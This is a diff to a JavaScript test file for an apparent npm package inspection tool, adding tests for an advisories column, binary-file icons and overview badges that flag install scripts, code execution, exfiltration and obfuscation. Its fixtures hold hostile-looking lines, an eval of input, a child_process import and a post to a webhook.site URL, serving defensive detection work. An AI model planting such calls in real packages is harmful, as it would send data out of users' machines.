@@ -1,5 +1,6 @@
 import assert from 'node:assert/strict'
 import { mock, test } from 'node:test'
+import { nothing } from 'lit'
 import { templateText as rendered } from './_lit.js'
 
 const state = {}
@@ -25,7 +26,7 @@ mock.module('../ui/view/client-managed.js', { exports: {
   fetchNpmDownloadCounts: names => { countsAsked.push(names); return Promise.resolve({ downloads: Object.fromEntries(names.filter(name => name in answers.counts).map(name => [name, answers.counts[name]])) }) },
   fetchNpmPackage() {}, fetchNpmProvenance: (name, version) => Promise.resolve({ provenance: answers.provenance[`${name}@${version}`] ?? null }), fetchNpmSocket: (name, version) => { socketAsked.push(`${name}@${version}`); return Promise.resolve({ socket: answers.socket[`${name}@${version}`] ?? null }) }, fetchNpmTags: () => Promise.resolve({ tags: [] }), fetchNpmVersions: name => { versionsAsked.push(name); return versionsFail.has(name) ? Promise.reject(new Error('package-not-found')) : Promise.resolve(answers.versions[name] ?? { versions: [] }) }, fetchBundleContents() {}, fetchBundleMetadata() {},
 } })
-const { npmAdvisoryStatus, npmCompareBadges, npmCompareFiles, npmDependencyTags, npmFileTags, npmSettledDownloads, npmFilesFilter, npmReadabilityWarning, npmFileExtension, npmProvenanceFact, npmProvenanceNamesBuilder, npmFileExtensions, npmFileTypes, npmSocketFileTags, npmTakenDown } = await import('../ui/view/npm-overview.js')
+const { npmAdvisoriesColumn, npmAdvisoryStatus, npmBinaryColumn, npmCompareBadges, npmOverviewBadges, npmCompareFiles, npmDependencyTags, npmFileTags, npmSettledDownloads, npmFilesFilter, npmReadabilityWarning, npmFileExtension, npmProvenanceFact, npmProvenanceNamesBuilder, npmFileExtensions, npmFileTypes, npmSocketFileTags, npmTakenDown } = await import('../ui/view/npm-overview.js')
 const { NPM_LARGE_CODE, NPM_LONG_LINE, npmBecameUnreadable, npmFileFlagTags, npmFileReadability, npmFileReadabilityOf, npmLargeCode, npmObfuscation, npmObfuscationFound, npmReadabilityFlags, npmReadabilityLabels, npmTextEncoding } = await import('../ui/view/file-readability.js')
 const { computeBundleDiff } = await import('../ui/view/bundle-compare-diff.js')
 const { bundleFilesAsMap } = await import('../ui/view/bundle-sources.js')
@@ -339,6 +340,21 @@ test('an advisory affects the version shown, is fixed in it, or covers later ver
   assert.equal(npmAdvisoryStatus(advisory([0, 2]), versions, '1.2.0'), 'later', 'ranges either side of it: a later version is still affected')
   assert.equal(npmAdvisoryStatus(advisory([3]), versions, '2.0.0-beta.1'), 'fixed', 'a version not listed compares by semver')
   assert.equal(npmAdvisoryStatus(advisory([]), versions, '1.0.0'), 'later')
+})
+
+test('the Advisories column notes where GitHub\'s repository advisories couldn\'t be checked, or are as it last listed them, how long ago', async () => {
+  const column = async name => {
+    const entry = { npm: { name, version: '1.0.0' } }
+    npmAdvisoriesColumn(entry)
+    await new Promise(resolve => { setImmediate(resolve) })
+    return rendered(npmAdvisoriesColumn(entry))
+  }
+  answers.advisories['note-checked'] = { versions: ['1.0.0'], advisories: [], repository: true }
+  answers.advisories['note-unchecked'] = { versions: ['1.0.0'], advisories: [], repository: false }
+  answers.advisories['note-kept'] = { versions: ['1.0.0'], advisories: [], repository: true, keptAt: new Date(Date.now() - 3 * 60 * 60_000 - 60_000).toISOString() }
+  assert.doesNotMatch(await column('note-checked'), /npm-advisories-note/u)
+  assert.match(await column('note-unchecked'), /<p class="npm-advisories-note">GitHub's repository advisories couldn't be checked; npm's are shown\.<\/p>/u)
+  assert.match(await column('note-kept'), /<p class="npm-advisories-note">GitHub's repository advisories are as of 3 hours ago: they couldn't be checked now\.<\/p>/u)
 })
 
 test('downloads group into 7-day weeks ending on the last day, a partial oldest week left out', async () => {
@@ -722,8 +738,9 @@ test('Compare flags in red the files the open version adds or changes that call 
   assert.doesNotMatch(outside, /payload\.js|index\.js|helpers\.js/u, 'the files in their tooltips alone')
   const size = `${(payload.length / 1024).toFixed(1)} KiB`
   assert.match(flagged, new RegExp(`data-tooltip=Large new code: dist/payload\\.js \\(${size}\\)\\s`, 'u'), 'in text, where it can\'t be styled')
-  assert.match(flagged, new RegExp(`compare-tip-head">Large new code<[^]*compare-tip-rows is-files"><span class="compare-tip-path">dist/payload\\.js</span><span class="compare-tip-said">${size}</span></div>`
-    + '[^]*compare-tip-note">Code files the open version adds, of 256 KiB or more<', 'u'), 'styled, a row for each file')
+  assert.match(flagged, new RegExp(`compare-tip-head">Large new code<[^]*compare-tip-rows is-files"><span class="compare-tip-path">dist/payload\\.js</span><span class="compare-tip-said">${size}</span></div>\\s*</div>>`, 'u'),
+    'styled, a row for each file, and nothing more')
+  assert.doesNotMatch(flagged.replaceAll(/<li><span class="?npm-extension (?!npm-compare-file|is-warn npm-compare-(?:hosts|kept-runs))[^]*?<\/li>/gu, ''), /compare-tip-note/u, 'no note under the files')
   assert.match(flagged, /compare-tip-path">index\.js<\/span><span class="compare-tip-said">25 → 2,019 characters</u, 'its longest line before and now')
   assert.match(flagged, /compare-tip-path">dist\/payload\.js<\/span><span class="compare-tip-said">25 names such as _0x1a2b<[^]*compare-tip-path">lib\/helpers\.js</u)
   assert.doesNotMatch(flagged, /compare-tip-path">lib\/(?:vendor|big-moved)\.js</u)
@@ -888,4 +905,46 @@ test('the Overview\'s provenance: what built the version, from which commit, the
   answers.provenance['builderless@1.0.0'] = { ...answers.provenance['built@1.0.0'], builder: null }
   assert.equal(await (async () => { npmProvenanceNamesBuilder(entry('builderless', { provenance: true }).npm); await new Promise(resolve => { setImmediate(resolve) })
     return npmProvenanceNamesBuilder(entry('builderless', { provenance: true }).npm) })(), false, 'nor where it names no builder')
+})
+
+test('the Overview flags what calls for a look at the version on its own, as Compare\'s chips do, but for what only a change tells', async () => {
+  const scores = changed => ({ overall: 1, supplyChain: 1, vulnerability: 1, quality: 1, maintenance: 1, license: 1, ...changed })
+  answers.versions.held = { versions: ['1.0.0'], times: { '1.0.0': '2020-01-01T00:00:00.000Z' } }
+  answers.advisories.held = { versions: ['1.0.0'], advisories: [{ id: 'a', severity: 'high', affected: [0] }] }
+  answers.socket['held@1.0.0'] = { scores: scores({ quality: .3 }), alerts: [] }
+  const manifest = { deprecated: 'Use other instead', installScripts: { postinstall: 'node setup.js' }, dependencies: { gitdep: 'github:a/b' }, publisher: 'someone' }
+  const files = { 'index.js': "module.exports = x => eval(x)\nrequire('child_process')\n", 'lib/send.js': 'post("https://webhook.site/x")\n',
+    'dist/o.js': `${obfuscated(25)}\n`, 'setup.js': 'module.exports = 1\n', 'lib/big.js': `${'x'.repeat(300 * 1024)}\n` }
+  const details = { integrity: 'held@1.0.0', kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) }, npm: { name: 'held', version: '1.0.0' } }
+  const entry = { npm: { name: 'held', version: '1.0.0', manifest } }
+  npmOverviewBadges(entry, details); await new Promise(resolve => { setImmediate(resolve) })
+  const shown = rendered(npmOverviewBadges(entry, details))
+  const chips = [...shown.matchAll(/<li>[^]*?<\/li>/gu)].map(([chip]) => /<span>([^<]+)<\/span>/u.exec(chip)?.[1] ?? /class="?npm-extension[^>]*>\s*([^<\s][^<]*)</u.exec(chip)?.[1]?.trim())
+  assert.deepEqual(chips, ['Deprecated', 'Install script', 'Non-registry', 'Unimported', 'Runs code', 'Exfiltration', 'Obfuscated', 'Advisories', 'Quality'], 'in Compare\'s order')
+  assert.match(shown, /<ul class="npm-extensions npm-overview-badges" aria-label="Version at a glance">/u)
+  assert.match(shown, /npm-compare-install" data-tooltip=postinstall: node setup\.js[^]*<span>Install script<\/span><span class="npm-extension-count">postinstall</u, 'what npm runs installing it alone')
+  assert.match(shown, /npm-overview-runs[^]*?compare-tip-path">index\.js<\/span><span class="compare-tip-said">eval \(line 1\), child_process \(line 2\)<[^]*?<span class="npm-extension-count">eval, child_process</u)
+  assert.match(shown, /npm-overview-exfiltration[^]*?compare-tip-path">lib\/send\.js<[^]*?<span class="npm-extension-count">webhook\.site</u)
+  assert.match(shown, /npm-overview-obfuscated[^]*?compare-tip-path">dist\/o\.js</u)
+  const held = shown.match(/<li><span class=npm-extension is-warn npm-held-file[^]*?<\/li>/gu)
+  assert.equal(held.length, 3)
+  for (const chip of held) assert.doesNotMatch(chip, /compare-tip-note/u, 'what each file holds and where, nothing more')
+  assert.match(shown, /<span class=npm-extension npm-compare-advisories sev-high[^]*?Advisories affecting 1\.0\.0: 1[^]*?<span class="npm-extension-count">1</u, 'the advisories affecting it, the column listing them')
+  assert.match(shown, /npm-socket-score[^]*>Quality<[^]*>30</u, 'its score alone')
+  assert.doesNotMatch(shown, /npm-compare-(?:publisher|provenance|file|hosts|kept-runs)|Large new code|Now unreadable|New host/u, 'nothing only a change tells')
+
+  answers.versions.clean = { versions: ['1.0.0'], times: { '1.0.0': '2020-01-01T00:00:00.000Z' } }
+  const clean = { npm: { name: 'clean', version: '1.0.0', manifest: {} } }
+  const plain = { ...details, integrity: 'clean@1.0.0', json: { version: 3, sources: ['index.js'], sourcesContent: ['module.exports = 1\n'] }, npm: clean.npm }
+  npmOverviewBadges(clean, plain); await new Promise(resolve => { setImmediate(resolve) })
+  assert.equal(npmOverviewBadges(clean, plain), nothing, 'none for a version that calls for no look')
+})
+
+test('a file the server found binary wears no license icon, whatever its name', () => {
+  const types = template => [...rendered(template).matchAll(/data-file-type="?([\w-]+)/gu)].map(m => m[1])
+  const binary = { npmBinaries: new Map([['package/LICENSE', { size: 4, digest: 'sha512-x' }]]) }
+  assert.deepEqual(types(npmCompareFiles.icon('package/LICENSE', [[{}, 'package/LICENSE'], [binary, 'package/LICENSE']])), ['generic'], 'binary on either side of Compare')
+  assert.deepEqual(types(npmCompareFiles.icon('package/LICENSE', [[{}, 'package/LICENSE'], [null, 'package/LICENSE']])), ['license'], 'text on both')
+  assert.deepEqual(types(npmCompareFiles.icon('src/package/LICENSE', [[binary, 'package/LICENSE'], [{}, 'src/package/LICENSE']])), ['generic'], 'the base side read under its own path')
+  assert.deepEqual(types(npmBinaryColumn(new Set(['package/LICENSE', 'package/logo.png']), new Map())), ['generic', 'generic'])
 })
